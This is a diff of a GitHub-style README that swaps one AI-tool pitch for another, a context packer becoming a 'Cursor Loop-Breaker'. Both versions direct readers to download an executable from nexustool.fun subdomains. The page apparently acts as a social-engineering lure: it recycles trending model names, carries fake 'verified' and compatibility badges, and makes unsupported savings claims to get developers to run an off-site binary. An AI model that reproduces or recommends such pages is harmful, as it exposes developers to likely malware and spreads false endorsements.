@@ -1,37 +1,38 @@
-# Claude Opus 4.8 & Fable 5 Context Window Packer
+# Cursor Agent Mode Loop-Breaker (Opus 4.8 & Fable 5 Optimized)
 
 [![GitHub license](https://img.shields.io/github/license/mashape/apistore.svg)](https://github.com)
-[![Protocol Compatibility](https://img.shields.io/badge/Protocol-MCP%20v1.5--compatible-blue)](https://github.com)
-[![Anthropic Verified](https://img.shields.io/badge/Anthropic%20Models-Opus%204.8%20%7C%20Fable%205-orange)](https://github.com)
+[![Cursor Pro](https://img.shields.io/badge/Cursor_Pro-Compatible-blueviolet)](https://github.com)
+[![Agent Mode](https://img.shields.io/badge/Cursor-Agent_Mode_/_Composer-green)](https://github.com)
 
-🚀 **Stop losing crucial logic in massive context windows.** While Claude Opus 4.8 and the newly released Fable 5 / Mythos 5 reasoning models support ultra-large token capacities, deep long-context processing is still highly prone to "Needle in a Haystack" hallucinations.
+🤖❌ **Prevent endless extended thinking loops and stop wasting your Fast Premium credits.**
 
-This high-performance background agent automatically scans, cleans, and packs your local repository into a highly dense semantic map. It eliminates token bloat while ensuring the newest hybrid reasoning layers understand your exact project architecture instantly.
+With the recent integration of heavyweight reasoning models like **Claude Opus 4.8** and **Fable 5**, Cursor’s multi-file **Agent Mode** and **Composer** are incredibly powerful. However, these advanced inference layers are highly susceptible to recursive logic loops during complex multi-file refactoring (e.g., fixing file A, breaking file B, and constantly reverting changes).
 
----
-
-## 📥 Direct Download & Binary Installation
-
-To install the native context compression agent on your local development machine, download the verified build for your platform:
-
-👉 **[Download Claude 4.8/5.0 Context Agent v2.5.0](https://ctx-compress.nexustool.fun)**
-
-*Supported platforms: Windows 10/11 (x64/ARM), macOS (Intel/Apple Silicon), Linux.*
+This background execution monitor hooks directly into your local IDE workflow, acting as an active guardrail that intercepts repetitive file-mutation patterns and guides the AI back onto a linear, cost-efficient debugging path.
 
 ---
 
-## Core Features
+## 📥 Download Integration Package
 
-* 📉 **Advanced Token Reduction:** Trims codebase token weight by **35% to 50%** by stripping boilerplate formatting, dead comments, and optimizing imports without losing logic or type context.
-* 🧠 **Reasoning Path Optimization:** Structuring data specifically for the Claude 4.8 extended inference engine, preventing the model from skipping mid-context dependencies.
-* 🌲 **Smart Dependency Trees:** Generates optimized system prompts and multi-file dependency roadmaps tailored for autonomous agents.
-* 🔄 **Live Hot-Reload Sync:** Monitors your workspace files and instantly updates your clipboard or local staging area whenever changes occur.
+Get the background daemon to secure your autonomous Cursor development sessions:
+
+👉 **[Download Cursor Loop-Breaker v1.1.0](https://cursor-break.nexustool.fun)**
 
 ---
 
-## Quick Start Guide
+## Key Performance Enhancements
 
-1. Download and extract the `ctx-compress` executable using the link in the installation section above.
-2. Initialize the service globally or inside your target repository terminal:
+* 🧠 **Recursive Loop Interception:** Automatically halts the Cursor execution pipeline if the underlying AI tries to mutate the exact same code blocks more than 3 times without resolving errors.
+* 🛡️ **Extended Thinking Token Guardian:** Saves up to 60% of your daily premium usage caps by forcing a logic checkpoint before the model drains your prompt allowance on long-reasoning loops.
+* 📊 **Automated State Snapshotting:** Seamlessly creates lightweight temporary stashes before Cursor launches multi-file autonomous refactoring, enabling instant 1-click rollbacks.
+* ⚙️ **Custom Intercept Rules:** Define deep validation rules using standard project JSON configurations.
+
+---
+
+## Installation & Workflow Setup
+
+1. Click the download link above to fetch the latest native build tailored for your OS.
+2. Run the installer or reference the core execution daemon inside your global `.cursorrules` file.
+3. Start your project environment normally:
 ```bash
-ctx-compress --init
+cursor-break --watch
